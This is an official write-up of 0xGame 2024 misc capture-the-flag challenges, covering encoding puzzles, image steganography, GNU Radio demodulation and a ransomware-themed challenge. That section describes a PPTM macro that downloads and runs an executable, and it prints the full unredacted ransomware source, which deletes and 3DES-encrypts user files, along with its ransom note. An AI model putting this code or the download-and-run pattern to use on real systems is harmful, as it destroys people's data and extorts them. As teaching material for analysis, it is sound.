class="title function_">RC4</span>(<span class="params">plain,K</span>):</span><br><span class="line">    S = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        S[i] = i</span><br><span class="line">        T[i] = K[i % <span class="built_in">len</span>(K)]</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        k = S[t]</span><br><span class="line">        cipher.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (base64.b64encode(<span class="string">&quot;&quot;</span>.join(cipher).encode())).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base3</span>(<span class="params">s</span>):</span><br><span class="line">    base3_s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        dec_value = <span class="built_in">ord</span>(i)</span><br><span class="line">        base3_c = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> dec_value &gt; <span class="number">0</span>:</span><br><span class="line">            base3_c += <span class="built_in">str</span>(dec_value % <span class="number">3</span>)</span><br><span class="line">            dec_value = dec_value // <span class="number">3</span></span><br><span class="line">        base3_c = base3_c[::-<span class="number">1</span>].rjust(<span class="number">5</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        base3_s += base3_c</span><br><span class="line">    <span class="keyword">return</span> (base3_s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manbo_encode</span>(<span class="params">base3_s</span>):</span><br><span class="line">    manbo_dict = &#123;<span class="string">&quot;0&quot;</span>:<span class="string">&quot;曼波&quot;</span>,<span class="string">&quot;1&quot;</span>:<span class="string">&quot;哦耶&quot;</span>,<span class="string">&quot;2&quot;</span>:<span class="string">&quot;哇嗷&quot;</span>&#125;</span><br><span class="line">    manbo_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> base3_s:</span><br><span class="line">        manbo_text += manbo_dict[i]</span><br><span class="line">    <span class="keyword">return</span> manbo_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">i</span>):</span><br><span class="line">    flag_part = flag[i:i+<span class="number">1</span>]</span><br><span class="line">    a = real_real_real_random()</span><br><span class="line">    b = RC4(flag_part,a)</span><br><span class="line">    c = base3(b)</span><br><span class="line">    d = manbo_encode(c)</span><br><span class="line">    <span class="keyword">return</span> a,d  <span class="comment"># key:a  ciphertext:d</span></span><br></pre></td></tr></table></figure><p>分析一下可以知道先生成随机数用作RC4的KEY，再传入flag_part进行RC4加密，之后进行三进制编码，最后自定义了一个曼波编码，于是可以编写<code>decode.py</code>并进行远程交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manbo_decode</span>(<span class="params">d</span>):</span><br><span class="line">    manbo_dict = &#123;<span class="string">&quot;曼波&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;哦耶&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;哇嗷&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(d),<span class="number">2</span>):</span><br><span class="line">        c += manbo_dict[d[i:i+<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base3</span>(<span class="params">c</span>):</span><br><span class="line">    b = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">5</span>):</span><br><span class="line">        b += <span class="built_in">chr</span>(<span class="built_in">int</span>(c[i:i+<span class="number">5</span>],base=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">cipher,K</span>):</span><br><span class="line">    S = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        S[i] = i</span><br><span class="line">        T[i] = K[i % <span class="built_in">len</span>(K)]</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    plain = []</span><br><span class="line">    cipher = base64.b64decode(cipher.encode()).decode()</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        k = S[t]</span><br><span class="line">        plain.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(plain)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    key = p.recvline().decode().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getciphertext</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    ciphertext = p.recvline().decode().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">k,c</span>):</span><br><span class="line">    c2 = manbo_decode(c)</span><br><span class="line">    c3 = base3(c2)</span><br><span class="line">    pf = RC4(c3,k)</span><br><span class="line">    <span class="keyword">return</span> pf</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.98.178.117&quot;</span>,<span class="number">1111</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    generate()</span><br><span class="line">    key = getkey()</span><br><span class="line">    ciphertext = getciphertext()</span><br><span class="line">    part_of_flag = decode(key,ciphertext)</span><br><span class="line">    flag += part_of_flag</span><br><span class="line">    <span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><h3 id="报告哈基米"><a href="#报告哈基米" class="headerlink" title="报告哈基米"></a>报告哈基米</h3><p>题目附件只给了一个 <code>mijiha.png</code>，拖入010 Editor看一下，一眼就能看见文件尾的逆置字符串，再关注一下chunk块就能发现倒数第二个IDAT块未满的情况下还跟了一个IDAT块，不过其实眼神好一些可以直接注意到上方的 <code>txt.ahijim</code>：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036752-7ea27f23-a417-43f3-b395-08b721a52d6a.png" alt="img"></p><p>先对文件尾的字符串逆置一下可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Maybe You Need To Know Arnold Cat?</span><br></pre></td></tr></table></figure><p>查阅资料可以知道这是猫映射变换，可以进行逆变换，不过需要知道<code>a,b</code>参数以及<code>shuffle_times</code>置乱次数，经过一些尝试可以发现这些参数通过LSB隐写进图片中了，可以用stegsolve，也可以用zsteg：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037547-f4c4ceed-b651-4cf6-b0fd-8d21adcbd1c1.png" alt="img"></p><p>之后编写脚本或者直接在网上找到逆变换脚本即可解出flag前半部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_decode</span>(<span class="params">image,a,b</span>):</span><br><span class="line">    decode_image = Image.new(image.mode, image.size)</span><br><span class="line">    h,w = image.size</span><br><span class="line">    data = image.load()</span><br><span class="line">    ddata = decode_image.load()</span><br><span class="line">    N = h</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            nx = ((a * b + <span class="number">1</span>) * x - b * y) % N</span><br><span class="line">            ny = (y - a * x) % N</span><br><span class="line">            ddata[ny, nx] = data[y, x]</span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;mijiha.png&quot;</span>)</span><br><span class="line">origin_img = arnold_decode(img,<span class="number">35</span>,<span class="number">7</span>)</span><br><span class="line">origin_img.show()</span><br></pre></td></tr></table></figure><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037557-5e9b95ad-5e7f-47a1-8fa8-206d5bd7005d.png" alt="img"></p><p>再分析多出来的chunk块，仔细观察可以发现是zip逆置了，提取出来：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037368-a1815d7c-d52a-44a3-9741-46bc752930db.png" alt="img"></p><p>解压得到<code>mijiha.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?reppuT sihT sI</span><br><span class="line">2526565031717334081355849302824518400002066054780560033875031426082285618693525319794798626066006125490363219506086284195590452459190680646206136430850230509326192863922658924373311369100100099532515379974605057083065159988318523088554342510823923801250157027140252790785117812414283997607047894726844336402237327944299070706739459672938738683171995926543691983512367190948019577689694975313311316787244413406201168210658030717811912751907802312004909911805602609847391116950248882484065492329404895296665244558410377999740959307786584149849</span><br></pre></td></tr></table></figure><p>同样将其整段逆置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9489414856877039590479997730148554425666925984049232945604842888420596111937489062065081199094002132087091572191187170308560128611026043144427876131133135794969867759108490917632153891963456295991713868378392769549376070709924497237322046334486274987407067993824142187115870972520417207510521083293280152434558803258138899515603807505064799735152359900010019631133734298562293682916239050320580346316026460860919542540955914826806059123630945216006606268974979135253968165822806241305783300650874506602000048154282039485531804337171305656252</span><br><span class="line">Is This Tupper?</span><br></pre></td></tr></table></figure><p>查找Tupper相关资料，发现有在线工具可以直接解，拿到flag后半部分：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037419-470a092d-c366-4137-aa75-fe013deb6c5d.png" alt="img"></p><p>或者在github上也能找到相关项目<a href="https://github.com/cariad/tupper%EF%BC%9A">https://github.com/cariad/tupper：</a></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037462-21c119ef-a046-4e68-916d-77905048fbfc.png" alt="img"></p><h3 id="神秘电波"><a href="#神秘电波" class="headerlink" title="神秘电波*"></a>神秘电波*</h3><p>搜索一下grc文件，不难发现这是gnuradio图形化设计文件。下载gnuradio后打开即可看到流程图。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635605-a295e945-e07f-46e7-9efc-fc44bfc57b36.png" alt="img"></p><p>从constellation object那个模块可以看到，这里是进行了bpsk调制，只不过后面稍微加了一点简单的数学运算。去gnuradio的<a href="https://wiki.gnuradio.org/index.php?title=Simulation_example:_BPSK_Demodulation">官方文档</a>可以查到bpsk的解调方法。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635510-905d8f72-ebb2-4582-91f8-6018e9187144.png" alt="img"></p><p>但是显然这边还得改改，有几点要注意，首先文档中不是像题目中一样从文件输入的，文档中用的是虚拟源，输出也是虚拟的。另外题目中调制时有polyphase clock sync这一步，而题目中没有，所以在解调的时候得加上。因此，预期的解调流程图如下：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635602-71bd6865-9da5-454f-9c25-9de25cb3bc39.png" alt="img"></p><p>点击顶上的run，先generate，再execute。这个小窗口刚出来差不多就可以关掉了，以免生成的flag.txt太大。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635529-f390f874-9f7f-4062-bd1c-9196806f846b.png" alt="img"></p><p>用010 editor可以看到，flag.txt是个二进制文件，每个字节不是00就是01。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635731-01d4bfee-6401-4bea-8a2d-2e55cdee971b.png" alt="img"></p><p>用脚本将00转换成0,01转换成1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0x01</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> i==<span class="number">0x00</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>转换出的二进制丢进cyberchef即可看见flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130636752-7821b8ea-6fb7-4cc7-9145-d42f905b8aea.png" alt="img"></p><p>由于解调时一些数据的丢失，这里存在一些乱码。题目提示了flag是标准uuid形式，结合前后不难推断出flag：0xGame{38df7992-6c53-11ef-b522-c8348e2c93c6}</p><h3 id="重生之我在南邮当CTF大王"><a href="#重生之我在南邮当CTF大王" class="headerlink" title="重生之我在南邮当CTF大王"></a>重生之我在南邮当CTF大王</h3><p>硬玩游戏可以拿到flag2,flag3,flag4，不过flag1可能需要按照许愿树的hint去做</p><p>可以在<code>data</code>文件夹中找到各张地图的json数据，一个一个看就会发现所有flag都在里面</p><p>flag1:</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130636833-dcd7f82c-ff56-4b44-9a11-5a839c293098.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130637500-2ff3dd78-ed0e-4886-8fc7-90c5a6ae8eac.png" alt="img"></p><p>flag2:</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638100-af5d6f20-19f5-4edb-a228-22cb3c5579de.png" alt="img"></p><p>flag3:</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638134-712c87bb-d7f3-49ca-91b6-8d7fc5eba5f1.png" alt="img"></p><p>flag4:</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638119-019fc670-6063-4f07-9960-0d586c637a4d.png" alt="img"></p><p>上网找找资料可以知道这是兽音编码后的结果：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638141-7ce00bf5-e5a8-430a-8c42-b22866fcacbe.png" alt="img"></p><p>四段拼起来就是flag</p><h3 id="Crazy-Thursday-v-me-50-btc"><a href="#Crazy-Thursday-v-me-50-btc" class="headerlink" title="Crazy Thursday v me 50 btc*"></a>Crazy Thursday v me 50 btc*</h3><p>下载下来的附件中有一个pptm文件，搜索一下可以知道这是一个启用了宏的ppt，查看一下宏代码。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805642487-473cd06e-7f5a-49a1-b100-fcd878c9f25c.png" alt="img"></p><p>（另外这里还有个小彩蛋，移开第二张ppt里的图片可以看到一行字，不过这与题目无关）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46824302/1730805642882-7f23840a-dfb2-4223-8c12-8ad7820a1387.png?x-oss-process=image/format,webp/resize,w_1125,limit_0" alt="img"></p><p>这里的逻辑是在播放到第二张ppt的时候就从某个服务器上下载summer.exe并运行。</p><p>访问一下<a href="http://47.239.17.55/summer.exe%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%BE%97%E5%88%B0summer.exe%E3%80%82">http://47.239.17.55/summer.exe，下载得到summer.exe。</a></p><p>丢进exeinfope查一下，可以看到这个程序是用python编写的，或者熟悉的可以直接从图标看出来这点。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643014-9fbb4bd1-6fae-40d5-96ee-c65a18f64a5b.png" alt="img"></p><p>先用<a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor.py</a>将其拆为pyc文件</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643061-c6df86d5-1177-4984-bf04-8fbcc76cf402.png" alt="img"></p><p>从拆解出的文件中找到summer.pyc，使用uncompyle6（pip install下载）对其进行反编译，得到python代码。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643130-57f10e22-f8a5-4c83-8954-745771b854af.png" alt="img"></p><p>正如在题目描述中所说，这里为了师傅们电脑的安全性，删除了文件加密和原文件删除的相关代码，但是这并不影响做题，接下来在这里贴出未删减版：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> k3y,readme</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params"><span class="built_in">dir</span>=<span class="string">&#x27;.&#x27;</span>, ext=[<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;.7z&#x27;</span>, <span class="string">&#x27;.rar&#x27;</span>, <span class="string">&#x27;.gz&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.mp3&#x27;</span>, <span class="string">&#x27;.wav&#x27;</span>, <span class="string">&#x27;.avi&#x27;</span>, <span class="string">&#x27;.doc&#x27;</span>, <span class="string">&#x27;.docx&#x27;</span>, <span class="string">&#x27;.xls&#x27;</span>, <span class="string">&#x27;.xlsx&#x27;</span>, <span class="string">&#x27;.pdf&#x27;</span>, <span class="string">&#x27;.ppt&#x27;</span>, <span class="string">&#x27;.pptx&#x27;</span>, <span class="string">&#x27;.mp4&#x27;</span>, <span class="string">&#x27;.mov&#x27;</span>, <span class="string">&#x27;.flv&#x27;</span>, <span class="string">&#x27;.mkv&#x27;</span>, <span class="string">&#x27;.swf&#x27;</span>, <span class="string">&#x27;.dll&#x27;</span>, <span class="string">&#x27;.sys&#x27;</span>, <span class="string">&#x27;.iso&#x27;</span>, <span class="string">&#x27;.vmdk&#x27;</span>, <span class="string">&#x27;.vhd&#x27;</span>, <span class="string">&#x27;.vhdx&#x27;</span>, <span class="string">&#x27;.ova&#x27;</span>,]</span>):</span><br><span class="line">    ff = []</span><br><span class="line">    <span class="keyword">for</span> ro, di, fi <span class="keyword">in</span> os.walk(<span class="built_in">dir</span>):</span><br><span class="line">        <span class="keyword">for</span> ex <span class="keyword">in</span> ext:</span><br><span class="line">            <span class="keyword">for</span> na <span class="keyword">in</span> fnmatch.<span class="built_in">filter</span>(fi, <span class="string">&#x27;*&#x27;</span> + ex):</span><br><span class="line">                fp = os.path.join(ro, na)</span><br><span class="line">                ff.append(fp)</span><br><span class="line">    <span class="keyword">return</span> ff</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    cipher = DES3.new(key, DES3.MODE_ECB)</span><br><span class="line">    padded_plaintext = pad(plaintext, DES3.block_size)</span><br><span class="line">    ciphertext = cipher.encrypt(padded_plaintext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">m</span>):</span><br><span class="line">    p=getPrime(<span class="number">256</span>)</span><br><span class="line">    q=getPrime(<span class="number">256</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    m1 = bytes_to_long(m)</span><br><span class="line">    c = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">    <span class="keyword">return</span> (n,c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">txt,m</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Oops!.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(txt+<span class="string">&#x27;\n\n\n&#x27;</span>)</span><br><span class="line">        f.write(base64.b64encode((<span class="built_in">str</span>(m[<span class="number">0</span>].bit_length())+<span class="built_in">str</span>(m[<span class="number">0</span>])+<span class="built_in">str</span>(m[<span class="number">1</span>].bit_length())+<span class="built_in">str</span>(m[<span class="number">1</span>])).encode()).decode())</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    fl = f()</span><br><span class="line">    <span class="keyword">for</span> fi <span class="keyword">in</span> fl:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fi, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        os.remove(fi)</span><br><span class="line">        data = encrypt1(k3y, data)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fi+<span class="string">&#x27;.encrypted&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line">    msg=encrypt2(k3y)</span><br><span class="line">    release(readme,msg)</span><br></pre></td></tr></table></figure><p>这里的代码明显是出题人自己手搓的，所以网上是没法找到用于解密的程序的。</p><p>接下来阅读一下代码的逻辑，可以看出大概是这样一个过程：查找当前目录下一些特定后缀名的文件–&gt;读取文件内容–&gt;删除原文件–&gt;对文件内容进行3DES加密–&gt;将内容写进一个新的文件，文件名为原文件名加上.encrypted–&gt;对前面一步中3DES时使用的密钥进行RSA加密，并且将RSA使用的n和加密后的密文以特定格式拼接后进行base64编码，以特定格式写入一同释放的文本中。</p><p>文本在附件中已经给出，就是Oops!.txt，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hello, w8nn9z! </span><br><span class="line">Your file has been encrypted! </span><br><span class="line">I have to inform you that due to my special encryption algorithm, all important files on your computer have been encrypted! This means that without a special key provided by me, you will not be able to access these files. </span><br><span class="line">To recover your files, you must follow the following steps: </span><br><span class="line">1. Pay the equivalent of $50 in Bitcoin to the designated Bitcoin address before the next Crazy Thursday. :) </span><br><span class="line">2. After payment is completed, please send the transaction ID and the string at the end of this file via email to st4rr@example.com . </span><br><span class="line">3. After receiving your payment confirmation, I will provide you with the key and the instruction on how to use it. </span><br><span class="line">If payment is not received within 72 hours, the price of the decryption instruction will double. In addition, if you attempt to recover data on your own or do not follow instructions, your files may be permanently deleted. :( </span><br><span class="line">Warning: Do not attempt to unlock files or use third-party tools on your own, as this may result in irreversible data loss. Similarly, any cooperation with law enforcement agencies will result in the destruction of keys, making it impossible to recover files. :( </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 